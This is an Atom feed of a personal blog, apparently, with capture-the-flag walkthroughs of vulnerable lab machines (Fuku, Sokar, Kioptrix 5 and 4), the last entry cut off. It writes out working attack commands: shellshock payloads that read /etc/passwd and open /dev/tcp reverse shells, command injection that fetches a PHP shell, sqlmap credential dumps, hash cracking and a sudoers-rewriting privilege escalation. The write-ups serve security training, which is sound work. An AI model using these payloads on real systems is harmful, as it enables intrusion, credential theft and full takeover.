<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulhub | Bob1Bob2]]></title>
  <link href="http://wg135.github.io/blog/categories/vulhub/atom.xml" rel="self"/>
  <link href="http://wg135.github.io/"/>
  <updated>2016-07-19T16:19:26-05:00</updated>
  <id>http://wg135.github.io/</id>
  <author>
    <name><![CDATA[Bob1Bob2]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SecTalks: BNE0x02 - Fuku]]></title>
    <link href="http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku/"/>
    <updated>2016-07-18T16:00:27-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Netcat</li>
<li>Wfuzz</li>
<li>Nikto</li>
<li>Joomscan</li>
</ul>


<h3>Vulnerability:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/6234/">Joomla 1.5.x - (Token) Remote Admin Change Password</a></li>
<li><a href="https://www.exploit-db.com/exploits/38775/">Chkrootkit - Local Privilege Escalation</a></li>
<li><a href="https://www.exploit-db.com/exploits/33673/">Joomla HD FLV Player SQL Injection Vulnerability</a></li>
</ul>


<!--more-->


<h3>Use Joomla! Remote Admin Chnage Password Exploit</h3>

<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.134 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.134 -p-</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>

<p>as we can see, almost every port is opening. I guess the target machine doesn&rsquo;t want hacker know which services are exactly running.</p>

<p>I use nc to read some ports such as 80 22 23. Port 22 gets result like:</p>

<pre><code>SSH-2.0-OpenSSH 6.7p1 Ububtu-5ubuntu1
</code></pre>

<p>while the rest of ports get the results:</p>

<p><img src="/images/blog/vulhub/fuku/Capture14.JPG" title="[title manually exploit [alt text]]" ></p>

<p>looks like I need to filter ports like these. I wrote a script to make life easier <a href="https://github.com/wg135/script/blob/master/filter.py">filter.py</a></p>

<p>After running the script, I find only port 22 and port 13370 are opening.</p>

<p>check the <a href="http://192.168.56.134:13370.">http://192.168.56.134:13370.</a> I got this</p>

<p><img src="/images/blog/vulhub/fuku/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>

<p>review the code:</p>

<p><img src="/images/blog/vulhub/fuku/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Looks like Joomla!</p>

<p>use wfuzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.134:13370/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>

<p>get some interesting path names</p>

<p>use Nikto to scan</p>

<p><code>nikto -h http://192.168.56.134:13370</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>

<p>check <a href="http://192.168.56.134:13370/administrator/">http://192.168.56.134:13370/administrator/</a> get the login page:</p>

<p><img src="/images/blog/vulhub/fuku/Capture7.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Now I can confirm it is Joomla!</p>

<p>use joomscan to scan:</p>

<p><code>joomscan -u http://192.168.56.134:13370</code></p>

<p>get the result:</p>

<p><img src="/images/blog/vulhub/fuku/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>

<p>follow the steps:</p>

<ul>
<li>go to <a href="http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></li>
<li>Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.</li>
</ul>


<p><img src="/images/blog/vulhub/fuku/Capture15.JPG" title="[title manually exploit [alt text]]" ></p>

<ul>
<li>input new password for admin</li>
</ul>


<p><img src="/images/blog/vulhub/fuku/Capture16.JPG" title="[title manually exploit [alt text]]" ></p>

<ul>
<li>go to <a href="http://192.168.56.134/administrator/">http://192.168.56.134/administrator/</a> to login with new password</li>
</ul>


<p><img src="/images/blog/vulhub/fuku/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Since it is Japanese version, I followed my post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php).</p>

<p><img src="/images/blog/vulhub/fuku/Capture17.JPG" title="[title manually exploit [alt text]]" ></p>

<p>I will edit beez file, copy the php reverse shell code to it and replace the IP address and port</p>

<p><img src="/images/blog/vulhub/fuku/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>

<p>set up netcat and get the shell</p>

<p><img src="/images/blog/vulhub/fuku/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>

<p>However, I cannot execute most commands even <code>python</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>

<p>try:</p>

<p><code>python2.7 -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p>works!</p>

<p>Now try to enumerate the os.</p>

<p><code>ps aux |grep root</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture18.JPG" title="[title manually exploit [alt text]]" ></p>

<p>looks like the <code>chkrootkit 0.49</code> is available.</p>

<p>I followed my previous post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php) to get the root:</p>

<pre><code>echo 'chmod 777 /etc/sudoers &amp;&amp; echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers &amp;&amp; chmod 440 /etc/sudoers' &gt; /tmp/update
</code></pre>

<p>then:</p>

<p><code>chmod 777 /tmp/update</code></p>

<p>then:</p>

<p><code>ls -al /etc/sudoers</code></p>

<p>finally get the root:</p>

<p><code>sudo su</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>

<h3>Exploit Joomla HD FLV Player SQL Injection</h3>

<p>in <a href="http://192.168.56.134/,">http://192.168.56.134/,</a> I found the target uses HD FLV Player</p>

<p><img src="/images/blog/vulhub/fuku/Capture19.JPG" title="[title manually exploit [alt text]]" ></p>

<p>check the source code:</p>

<p><img src="/images/blog/vulhub/fuku/Capture20.JPG" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit HD FLV</code></p>

<p><img src="/images/blog/vulhub/fuku/Capture25.JPG" title="[title manually exploit [alt text]]" ></p>

<p>follow the instructions:</p>

<pre><code>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&amp;id=1" -p id --dbms mysql --tables --level=5 --risk=3
</code></pre>

<p><img src="/images/blog/vulhub/fuku/Capture21.JPG" title="[title manually exploit [alt text]]" ></p>

<p>now get the columns of the table <code>jos_users</code></p>

<pre><code>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&amp;id=1" -p id --dbms mysql -T jos_users --columns
</code></pre>

<p><img src="/images/blog/vulhub/fuku/Capture22.JPG" title="[title manually exploit [alt text]]" ></p>

<p>now I am interested in column username and password</p>

<pre><code>sqlmap -u "http://192.168.56.134:13370/index.php?option=com_hdflvplayer&amp;id=1" -p id --dbms mysql -T jos_users -C username,password --dump
</code></pre>

<p><img src="/images/blog/vulhub/fuku/Capture23.JPG" title="[title manually exploit [alt text]]" ></p>

<p>The first part should be hash and the second part should be salt. I used joomla password crack tool <a href="https://github.com/wg135/script/blob/master/joomla.pl">joomlacrack.pl</a>. Here is also my python version <a href="https://github.com/wg135/script/blob/master/crackjoomla.py">crackjoomla.py</a></p>

<p>crack admin&rsquo;s password now</p>

<p><img src="/images/blog/vulhub/fuku/Capture26.JPG" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/fuku/Capture24.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Then login as admin, upload php reverse shell, same as I worked in the first part of this post.</p>

<p>Aslo, since the hash format is like hash:salt. I found the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat example hashes</a>, the MD5 format should be <code>md5($pass.$salt)</code>, so that in hashcat for option <code>-m</code> the value should be 10 (hashcat &ndash;help, check the * Hash types)</p>

<p>use hashcat crack:</p>

<p><code>hashcat -m 10 -a 0 -o joompass.txt --remove 61.hash /usr/share/wordlists/rockyou.txt</code></p>

<p>DONE</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub-sokar]]></title>
    <link href="http://wg135.github.io/blog/2016/07/15/vulhub-sokar/"/>
    <updated>2016-07-15T10:27:33-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/15/vulhub-sokar</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>User Agent Switcher</li>
</ul>


<h3>Vulnerability:</h3>

<ul>
<li><a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">shellshock(remote)</a></li>
<li><a href="http://stackoverflow.com/questions/26041934/how-does-cve-2014-7169-work-breakdown-of-the-test-code">shellshock(local)</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>

<p>192.168.56.103 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.56.103 -p-</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>

<p>port 591 is opening, looks like it is running http service.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.56.103:591</code></p>

<p>nothing cool.</p>

<p>Use wufzz to scan</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.103/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>

<p>find an interesting path <code>cgi-bin</code>. Thats interesting, because it reminds shellshock.</p>

<p>Use brower to check the web page</p>

<p><img src="/images/blog/vulhub/sokar/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>

<p>The web page shows result of commands <code>netstat</code> and <code>iostat</code>.</p>

<p>check the source code find the cgi path <code>/cgi-bin/cat</code></p>

<p><img src="/images/blog/vulhub/sokar/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>

<p>start to verfiy shellshock:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p><img src="/images/blog/vulhub/sokar/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Confirmed.Also find two user names <code>bynarr</code> and <code>apophis</code></p>

<p>I tried to upload reverse shell</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/bash -i &gt; /dev/tcp/192.168.56.102/4444 0&lt;&amp;1" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p>failed. I guess because certain ports are allowed.</p>

<p>keep going&hellip;</p>

<p>check the files belong to bynarr:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /usr/bin/find / -user bynarr " "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p><img src="/images/blog/vulhub/sokar/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>

<p>Try to read each file I got, and find the <code>va/spool/mail/bynarr</code> is very interesting.</p>

<p><img src="/images/blog/vulhub/sokar/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>

<p>so now I know I can only use port 51242 to setup reverse shell.</p>

<p>Also I noticed that <code>.</code> is in environment variable <code>$PATH</code>, so that I can run a script in the current path firstly.</p>

<p>write the reverse shell to iostat:</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/echo -e '#/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.102/51242 0&gt;&amp;1' &gt; /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p>add the x attribute</p>

<pre><code>wget -q -O- -U "() { test;};echo \"content-type: text/plain\"; echo; echo; /bin/chmod +x /home/bynarr/iostat" "http://192.168.56.103:591/cgi-bin/cat"
</code></pre>

<p>After serverl seconds I got shell:</p>

<p><img src="/images/blog/vulhub/sokar/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>

<p>next run <code>sudo -l</code> to check allowed commands for bynarr</p>

<p><img src="/images/blog/vulhub/sokar/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>

<p>so /home/bynarr/lime which is owned by root that bynarr can run.</p>

<p>in order to check shell shock locally. run:</p>

<p><code>env x='() { :;}; echo vulnerable' bash -c "echo this is a test"</code></p>

<p>local shell shock works</p>

<p><img src="/images/blog/vulhub/sokar/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>

<p>from the <code>sudo -l</code> output, there are many environment variables can be used. I ued USERNAME</p>

<p><code>sudo USERNAME='() { :;}; /bin/bash' /home/bynarr/lime</code></p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/sokar/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kioptrix2014 (#5)]]></title>
    <link href="http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5/"/>
    <updated>2016-07-07T14:27:35-05:00</updated>
    <id>http://wg135.github.io/blog/2016/07/07/kioptrix2014-number-5</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Nikto</li>
<li>User Agent Switcher</li>
</ul>


<h3>Vulnerability:</h3>

<ul>
<li><a href="https://www.exploit-db.com/exploits/21665/">phptax 0.8 - Remote Code Execution Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/31173/">pChart2.1.3 Directory Traversal Vulnerability</a></li>
<li><a href="https://www.exploit-db.com/exploits/26368/">FreeBSD 9.0-9.1 mmap/ptrace - Privilege Esclation Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/28718/">FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation Exploit</a></li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.193 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.193 -p-</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 80 and 8080 are opening</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.79.193</code></p>

<p>nothing cool.</p>

<p>Use firefox to check the page port 80</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>just simple It works</p>

<p>port 8080</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>got forbidden. Great :(</p>

<p>now go back to port 80 and check the source code</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>find pchart2.1.3. <a href="http://www.pchart.net/">pchart</a>. I googled pchart2.1.3, find exploits <a href="https://www.exploit-db.com/exploits/31173/">pChart 2.1.3 - Multiple Vulnerabilities</a>. I will use directory traversal.</p>

<p><code>http://192.168.79.193/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fetc/passwd</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>got passwd file, this is good, but not godd enough because I cannot shadow file.</p>

<p>Since Nmap determinate the target OS is FreeBSD, the Apache configure file is /usr/local/etc/apache2x/httpd.conf`. <a href="https://www.freebsd.org/doc/handbook/network-apache.html">Apache HTTP Server</a></p>

<p><code>192.168.79.193/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf</code></p>

<p>Here I find:</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>The port 8080 only allow Mozilla/4.0 user-agent.  I use User Agent Switcher (firefox plugin) to change my user-agent to <code>Mozilla/4.0</code>, then visit 192.168.79.193:8080</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now search phptax</p>

<p><code>searchsploit phptax</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>test upload php shell first:</p>

<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob; uname &gt; test.txt&amp;pdf=make</code></p>

<p><code>http://192.168.79.193:8080/phptax/test.txt</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Here I tired to wget the php shell from my http server didn&rsquo;t work. I also tried to write php shell to a php file driectly, also failed. Now I use ftp to upload my shell:</p>

<p>check if ftp is availabe:</p>

<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;which ftp &gt;test1.txt; &amp;pdf=make</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>php reverse shell:</p>

<p><code>/usr/share/webshells/php/php-reverse-shell.php</code></p>

<p>change the IP address:</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>upload the shell using <a href="ftp:">ftp:</a></p>

<p><code>http://192.168.79.193:8080/phptax/index.php?pfilez=1040pg1.tob;ftp -4 -d -v ftp://bobftpusername:bobftppassword@192.168.79.173//reverse.php; &amp;pdf=make</code></p>

<p>set up nc listener</p>

<p>get the shell:</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>check the kernel version</p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Its FreeBSD 9.0-RELEASE, <code>searchsploit freebsd 9.0</code></p>

<p><img src="/images/blog/vulhub/kioptrix5/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>copy these two exploits to /ftphome/</p>

<p>download them to the target:</p>

<p><code>ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//26368.c</code>
<code>ftp -4 -d -v ftp://bobftpusername:bobftppassward@192.168.79.173//28718.c</code></p>

<p>get the F***ing root:</p>

<p><code><img src="/images/blog/vulhub/kioptrix5/Selection_017.png" title="[title manually exploit [alt text]]" ></code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Vulhub Kioptrix Level 4]]></title>
    <link href="http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4/"/>
    <updated>2016-06-15T16:10:59-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/15/vulhub-kioptrix-level-4</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>wfuzz</li>
<li>nikto</li>
<li>zap</li>
<li>Burpsuite</li>
<li>Sqlmap</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.79.0/24</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.79.190 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.79.190 -p-</code></p>

<pre><code># nmap -sV -v -O -A -T5 192.168.79.190 -p-

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-15 16:14 CDT
NSE: Loaded 138 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Initiating NSE at 16:14
Completed NSE at 16:14, 0.00s elapsed
Initiating ARP Ping Scan at 16:14
Scanning 192.168.79.190 [1 port]
Completed ARP Ping Scan at 16:14, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:14
Completed Parallel DNS resolution of 1 host. at 16:14, 1.99s elapsed
Initiating SYN Stealth Scan at 16:14
Scanning 192.168.79.190 [65535 ports]
Discovered open port 445/tcp on 192.168.79.190
Discovered open port 139/tcp on 192.168.79.190
Discovered open port 80/tcp on 192.168.79.190
Discovered open port 22/tcp on 192.168.79.190
Completed SYN Stealth Scan at 16:14, 11.91s elapsed (65535 total ports)
Initiating Service scan at 16:14
Scanning 4 services on 192.168.79.190
Completed Service scan at 16:14, 11.02s elapsed (4 services on 1 host)
Initiating OS detection (try #1) against 192.168.79.190
NSE: Script scanning 192.168.79.190.
Initiating NSE at 16:14
Completed NSE at 16:15, 15.56s elapsed
Initiating NSE at 16:15
Completed NSE at 16:15, 0.01s elapsed
Nmap scan report for 192.168.79.190
Host is up (0.00033s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:EA:4D:22 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Uptime guess: 0.001 days (since Wed Jun 15 16:13:14 2016)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=203 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| Names:
|   KIOPTRIX4&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   KIOPTRIX4&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   KIOPTRIX4&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
|_  WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2016-06-15T17:15:00-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.33 ms 192.168.79.190

NSE: Script Post-scanning.
Initiating NSE at 16:15
Completed NSE at 16:15, 0.00s elapsed
Initiating NSE at 16:15
Completed NSE at 16:15, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.54 seconds
           Raw packets sent: 91558 (4.029MB) | Rcvd: 39548 (1.583MB)
</code></pre>

<p>Services ssh, http and smb are running.</p>

<h3>check HTTP service:</h3>

<p>use wfuzz to scan:</p>

<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.190/FUZZ 2&gt;/dev/null</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>use nikto to scan:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<h3>check SMB service:</h3>

<p>use enum4linux to enumerate SMB:</p>

<p><code>enum4linux -a 192.168.79.190</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>I searched exploitdb and metasploit and tried serveral exploits to SMB, failed.</p>

<p>Now I turn to http service.</p>

<p>use zap to scan:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like there is a SQL injection in parameter mypassword.</p>

<p>use Burp to check:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>save the POST request to a file called test.txt</p>

<p>run sqlmap to dump the credential:</p>

<p><code>sqlmap -r test.txt -p mypassword --dump</code></p>

<p>get:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>now try to login to web and see if I can upload webshell:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Nothing excited.</p>

<p>Okay, try to login via SSH:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>It is an limited shell:</p>

<p>&lsquo;ls -ahlR /root/&rsquo;</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>After google it, I found it may be lshell</p>

<p><a href="https://github.com/ghantoos/lshell">lshell</a></p>

<p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p>

<p>looks like it support command echo, try to get bash:</p>

<p><code>echo os.system("/bin/bash")</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>Got the shell now!</p>

<p>start to get root&hellip;</p>

<p>Enumeration stage,</p>

<p><code>uname -a</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p><code>searchsploit linux kernel 2.6 | grep local</code> and I pick sendpage one</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>download the exploit to /var/www/html/:</p>

<p><code>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/9641.tar.gz</code></p>

<p>start web server:</p>

<p><code>service apache2 start</code></p>

<p>in kioptrix4</p>

<p><code>wget http://192.168.79.173/9641.tar.gz</code></p>

<p>hang there, maybe iptable block the traffic to port 80</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>I tried <code>/bin/bash -i &gt; /dev/tcp/192.168.79.173/1234 0&lt;&amp;1</code> also doesn&rsquo;t work</p>

<p>finally I used python SimpleHTTPServer:</p>

<p><code>service apache2 stop</code>
<code>python -m SimpleHTTPServer</code></p>

<p>in kioptrix4</p>

<p><code>wget 192.168.79.173:8000/9641.tar.gz</code></p>

<p>unzip it:</p>

<p><code>tar zxvf 9641.tar.gz</code></p>

<p>try to compile it, cannot find gcc. WTF</p>

<p>search it</p>

<p><code>whereis gcc</code></p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>this is a folder, and it is i486-linux-gnu, check kioptrix4&rsquo;s architecture.</p>

<p><code>uname -m</code>
It is i686. Oh different&hellip;.</p>

<p>Luckly, my kali is i686, I just compile on my kali and upload to kioptrix4</p>

<p>run it</p>

<p>get the root:</p>

<p><img src="/images/blog/vulhub/kioptrix4/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[vulhub-Kioptrix Level 3]]></title>
    <link href="http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3/"/>
    <updated>2016-06-09T11:42:38-05:00</updated>
    <id>http://wg135.github.io/blog/2016/06/09/vulhub-kiotrix3</id>
    <content type="html"><![CDATA[<h3>Tools:</h3>

<ul>
